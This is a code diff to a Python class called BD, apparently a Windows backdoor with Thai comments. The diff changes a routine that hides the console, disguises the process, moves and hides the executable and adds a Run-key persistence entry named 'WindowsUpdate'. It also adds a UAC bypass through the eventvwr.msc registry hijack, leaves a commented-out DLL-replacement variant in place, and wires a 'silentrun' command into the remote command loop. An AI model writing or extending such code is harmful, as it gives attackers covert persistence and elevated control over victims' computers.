@@ -266,46 +266,47 @@ class BD:
 
 
     def hide_self(self):
-            """ซ่อนตัวเองในระบบ"""
+        """ซ่อนตัวเองในระบบ"""
+        try:
+            
+            # ทำการซ่อน console
+            hwnd = win32gui.GetForegroundWindow()
+            win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
+            
+            # เปลี่ยนชื่อ process ให้เหมือน system process
+            current_pid = os.getpid()
+            process_name = "svchost.exe"  # หรือชื่ออื่นๆ ที่ดูเป็น system process
+            
+            # ปรับ priority และ affinity
+            handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, True, current_pid)
+            win32process.SetPriorityClass(handle, win32process.IDLE_PRIORITY_CLASS)
+            
+            # ย้ายไฟล์ไปที่ system directory
+            if not self.is_in_system_dir():
+                self.move_to_system_dir()
+            
+            # ซ่อนไฟล์
             try:
+                win32api.SetFileAttributes(sys.executable, win32con.FILE_ATTRIBUTE_HIDDEN)
+            except:
+                pass
                 
-                # ทำการซ่อน console
-                hwnd = win32gui.GetForegroundWindow()
-                win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
-                
-                # เปลี่ยนชื่อ process ให้เหมือน system process
-                current_pid = os.getpid()
-                process_name = "svchost.exe"  # หรือชื่ออื่นๆ ที่ดูเป็น system process
-                
-                # ปรับ priority และ affinity
-                handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, True, current_pid)
-                win32process.SetPriorityClass(handle, win32process.IDLE_PRIORITY_CLASS)
-                
-                # ย้ายไฟล์ไปที่ system directory
-                if not self.is_in_system_dir():
-                    self.move_to_system_dir()
-                
-                # ซ่อนไฟล์
-                try:
-                    win32api.SetFileAttributes(sys.executable, win32con.FILE_ATTRIBUTE_HIDDEN)
-                except:
-                    pass
-                    
-                # เพิ่มการซ่อนใน Registry
-                reg_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-                reg_name = "WindowsUpdate"
-                
-                try:
-                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, 
-                                    winreg.KEY_WRITE)
-                    winreg.SetValueEx(key, reg_name, 0, winreg.REG_SZ, sys.executable)
-                    winreg.CloseKey(key)
-                except:
-                    pass
+            # เพิ่มการซ่อนใน Registry
+            reg_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+            reg_name = "WindowsUpdate"
+            
+            try:
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, 
+                                winreg.KEY_WRITE)
+                winreg.SetValueEx(key, reg_name, 0, winreg.REG_SZ, sys.executable)
+                winreg.CloseKey(key)
+            except:
+                pass
 
-                return True
-            except Exception:
-                return False
+            return True
+        except Exception:
+            return False
+        
 
         
     def system_shutdown(self):
@@ -380,6 +381,44 @@ class BD:
                 return f"[-] Execution error: {result.stderr}"
         except Exception as e:
             return f"[-] Admin execution error: {str(e)}"
+        
+
+    # def silent_uac_bypass_run(self, program_path):
+    #     try:
+    #         system32 = os.path.expandvars("%SystemRoot%\\System32")
+    #         target_dll = os.path.join(system32, "cryptbase.dll")
+    #         backup_dll = os.path.join(system32, "cryptbase.dll.bak")
+            
+    #         if os.path.exists(target_dll):
+    #             os.rename(target_dll, backup_dll)
+                
+    #         shutil.copy2(program_path, target_dll)
+            
+    #         # รัน trigger process ด้วยสิทธิ์ admin
+    #         subprocess.Popen("consent.exe", shell=True)
+    #         time.sleep(2)
+            
+    #         # คืนค่า DLL เดิม
+    #         os.remove(target_dll)
+    #         os.rename(backup_dll, target_dll)
+    #         return "[+] Program executed without UAC"
+    #     except Exception as e:
+    #         return f"[-] Execution failed: {str(e)}"
+
+    def silent_uac_bypass_run(self, program_path):
+        try:
+            key_path = "Software\\Classes\\mscfile\\shell\\open\\command"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, program_path)
+            winreg.CloseKey(key)
+            
+            subprocess.Popen("eventvwr.msc")
+            time.sleep(2)
+            
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+            return "[+] Program executed without UAC"
+        except Exception as e:
+            return f"[-] Execution failed: {str(e)}"
 
     def run_cmd(self):
         while True:
@@ -412,6 +451,9 @@ class BD:
 
                 elif cmd[0] == "sysinfo":
                     cmd_result = self.system_info()
+
+                elif cmd[0] == "silentrun" and len(cmd) > 1:
+                    cmd_result = self.silent_uac_bypass_run(cmd[1])
 
                 else:
                     cmd_result = self.execute_sys_cmd(cmd)
